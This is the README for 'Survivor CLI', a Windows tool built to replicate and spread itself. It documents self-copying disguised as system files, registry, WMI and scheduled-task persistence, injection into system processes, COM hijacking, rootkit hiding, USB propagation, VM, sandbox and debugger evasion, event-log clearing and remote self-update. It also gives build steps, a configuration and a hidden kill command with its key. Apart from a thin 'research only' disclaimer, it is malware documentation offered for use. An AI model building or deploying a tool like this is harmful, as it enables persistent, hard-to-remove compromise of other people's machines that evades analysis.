# Survivor CLI

**Version 2.3.0** | Self-preserving autonomous CLI tool that copies, moves, renames, and spreads itself across the filesystem while running persistent background processes.

**Warning: This tool is for learning and research purposes only. The author is not responsible for any misuse.**

---

## 🌐 Language / 语言

- **English** (current)
- [📘 中文文档](README_CN.md) (Chinese Documentation)

---

## Version History

| Version | Date | Description |
|---------|------|-------------|
| 1.0.0 | 2026-04-25 | Initial version: Basic copy/move/rename/plant functions |
| 2.0.0 | 2026-04-25 | Background daemon threads, self-healing, intelligent target selection |
| 2.1.0 | 2026-04-25 | Timestomping, ADS, scheduled task camouflage, integrity verification |
| 2.2.0 | 2026-04-25 | Modular architecture, anti-debugging, VM evasion, permission detection, self-recovery |
| 2.3.0 | 2026-04-25 | Stealth enhancements, WMI persistence, DLL injection, self-update, P2P encrypted communication, Windows service mode, COM hijacking, Rootkit capabilities |

---

## Features

### Core Capabilities

| Feature | Description |
|---------|-------------|
| **Self-replication** | Copy itself to any specified path |
| **Self-movement** | Move itself to a new location and continue running |
| **Self-renaming** | Disguise as system files (svchost.exe, rundll32.exe, etc.) |
| **Self-deletion/Recovery** | Delete current instance and recover from other copies |
| **Environment Variable Operations** | Add/remove own directory to/from PATH |
| **Startup Persistence** | Achieve persistence via registry Run keys and scheduled task camouflage |

### Modular Architecture (v2.3.0)

Code is organized into clear functional modules:

```
survivor::
├── utils        # General utility functions
├── detection    # Environment detection (VM, monitoring, analysis environments)
├── injection    # Process injection
├── persistence  # Persistence (registry, scheduled tasks)
├── ads          # NTFS Alternate Data Streams
├── spread       # Propagation logic
├── registry     # Instance registry management
├── cleanup      # Log cleanup
├── usb          # USB propagation
├── network      # Network scanning
├── loops        # Background thread loops
├── commands     # Command-line command handling
├── daemon       # Daemon startup
├── stealth      # File attribute hiding/protection
├── wmi          # WMI event subscription persistence
├── dll          # DLL creation and injection
├── update       # Remote self-update
├── p2p          # P2P encrypted communication
├── com          # COM component hijacking
├── rootkit      # Rootkit hiding capabilities
└── service      # Windows service mode
```

### Environment Awareness & Evasion

| Detection Item | Description | Response Behavior |
|----------------|-------------|-------------------|
| **VM Detection** | Detect VirtualBox, VMware, QEMU, etc. | Propagation interval extended by 10x |
| **Monitoring Tool Detection** | Detect Procmon, Process Hacker, etc. | Silent mode (no log output) |
| **Analysis Environment Detection** | Detect sandboxes, computer names with test markers | Extreme caution (50x delay) |
| **Anti-Debug** | Detect debugger presence | Silent mode |
| **Permission Detection** | Detect if running as administrator | Displayed in status |

### Autonomous Behavior

When started without parameters, automatically runs the following background threads:

| Thread | Function | Interval |
|--------|----------|----------|
| **SpreadingLoop** | Randomly copy/move/rename to user directories | 30s-5min |
| **MonitoringLoop** | Detect missing copies, immediately counterattack and recover | 500ms |
| **RestorationLoop** | Periodically check and restore missing copies | 30s |
| **GuardianLoop** | Inject into critical system processes, monitor and re-inject | 5min |
| **USBMonitorLoop** | Detect USB insertion, automatically propagate to USB drives | 5s |
| **CleanupLoop** | Clean log files and system event logs | 30min |

### Security Features

- **Path Validation**: Prevent `..` path traversal attacks
- **XOR Encrypted Registry**: Instance list stored with simple encryption
- **Checksum Verification**: Built-in checksum for integrity check
- **Self-Cleanup**: Backdoor command can completely clear all traces

---

## Command Line Interface

### Basic Usage

```bash
survivor.exe [command] [arguments]
```

### Available Commands

| Command | Description | Example |
|---------|-------------|---------|
| *(no parameters)* | Start in daemon mode | `survivor.exe` |
| `copy <path>` | Copy itself to target path | `survivor.exe copy C:\temp\test.exe` |
| `move <path>` | Move itself to target path | `survivor.exe move D:\tools\survivor.exe` |
| `rename <name>` | Rename current instance | `survivor.exe rename svchost.exe` |
| `hide` | Delete self, recover from backup | `survivor.exe hide` |
| `env --add` | Add current directory to PATH | `survivor.exe env --add` |
| `env --remove` | Remove current directory from PATH | `survivor.exe env --remove` |
| `plant` | Set startup persistence | `survivor.exe plant` |
| `status` | Show detailed status | `survivor.exe status` |
| `summon` | List all known instances | `survivor.exe summon` |
| `sync` | Sync all instances to latest version | `survivor.exe sync` |
| `check` | Check and restore missing instances | `survivor.exe check` |
| `spread` | Manually trigger propagation | `survivor.exe spread` |
| `guardian` | Inject into critical processes | `survivor.exe guardian` |
| `version` | Show version information | `survivor.exe version` |
| `verify` | Verify integrity and checksum | `survivor.exe verify` |

### Hidden Commands

| Command | Description | Key |
|---------|-------------|-----|
| `ilovecwj <key>` | Emergency backdoor: delete all instances | `cwj_rocks_2026` |

---

## Build

### Requirements

- MinGW g++ 17+ / MSVC 2019+
- CMake 3.10+
- Windows SDK

### Build Steps

```bash
# Create build directory
mkdir build
cd build

# Configure CMake
cmake -G "MinGW Makefiles" ..

# Compile
mingw32-make

# Run
./survivor.exe --help
```

### Dependencies

Linked via CMake `target_link_libraries`:

- `shell32`
- `advapi32`
- `iphlpapi`
- `wininet`
- `winmm`
- `kernel32`

---

## Technical Details

### Registry Storage

Instance list stored in (XOR encrypted):
```
%APPDATA%\survivor\registry.dat
```

### Global Configuration

```cpp
struct Config {
    int spread_interval_min = 30;
    int spread_interval_max = 300;
    int monitor_interval_ms = 500;
    int restore_interval_sec = 30;
    int guardian_interval_min = 5;
    int usb_scan_interval_sec = 5;
    int cleanup_interval_min = 30;
    int counterattack_count = 5;
    bool enable_timestomping = true;
    bool enable_ads = true;
    bool enable_scheduled_task = true;
    bool enable_event_log_cleaning = true;
    bool enable_self_healing = true;
    bool enable_anti_debug = true;
    bool enable_vm_evasion = true;
};
```

### Environment Variables

| Variable | Description |
|----------|-------------|
| `g_running` | Control background thread execution |
| `g_daemon` | Whether in daemon mode |
| `g_spreading` | Whether propagating |
| `g_spread_multiplier` | Propagation interval multiplier |
| `g_verbose` | Whether to output logs |

---

## Testing Guide

### Important Warning

**Strongly recommend testing in an isolated environment.** It will automatically propagate and be difficult to fully remove.

### Recommended: Virtual Machine Testing

1. Use VirtualBox or VMware to create a Windows virtual machine
2. Create a snapshot before testing
3. Run tests in the virtual machine
4. Restore the snapshot after testing

### Manual Testing Steps

```batch
# View help
survivor.exe --help

# View version
survivor.exe version

# View status
survivor.exe status

# Verify integrity
survivor.exe verify

# Copy to temp directory
survivor.exe copy C:\temp\survivor_test.exe

# Emergency delete (use with caution)
survivor.exe ilovecwj cwj_rocks_2026
```

---

## Uninstallation

### Normal Uninstall

```batch
# Use backdoor (requires key)
survivor.exe ilovecwj cwj_rocks_2026
```

### Manual Cleanup

```batch
# Delete registry
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Survivor /f
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsUpdateCheck /f

# Clean AppData
rmdir /s /q "%APPDATA%\survivor"
```

---

## Key

```
cwj_rocks_2026
```

---

**Last Updated**: 2026-04-25  
**Do Not Misuse**

---

[📘 查看中文文档 / View Chinese Documentation](README_CN.md)
